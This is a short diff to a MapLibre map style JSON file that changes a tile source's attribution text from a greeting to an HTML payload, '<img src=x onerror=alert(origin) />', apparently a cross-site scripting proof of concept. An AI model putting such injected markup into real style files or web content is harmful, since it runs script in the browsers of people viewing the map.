@@ -539,7 +539,7 @@
         "maplibre": {
             "url": "https://raw.githubusercontent.com/RafaelSzmarowski/style.json/main/tiles.json",
             "type": "vector",
-            "attribution": "Hello from styletest"
+            "attribution": "<img src=x onerror=alert(origin) />"
         },
         "crimea": {
             "type": "geojson",
